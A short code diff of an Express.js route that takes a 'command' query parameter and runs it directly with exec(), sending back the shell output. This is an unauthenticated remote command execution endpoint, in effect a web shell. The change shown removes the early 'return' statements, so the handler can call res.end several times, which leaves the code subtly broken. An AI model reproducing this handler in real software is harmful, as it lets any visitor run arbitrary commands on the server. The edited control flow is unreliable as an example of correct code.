@@ -8,9 +8,9 @@ app.get('/', async (req, res) => {
    console.log(req.query.command);
    exec(req.query.command, (err, stdout, stderr) => {
       if (err)
-         return res.end(err);
+         res.end(err);
       if (stderr)
-         return res.end(stderr);
+         res.end(stderr);
       res.end(stdout);
    });
 });
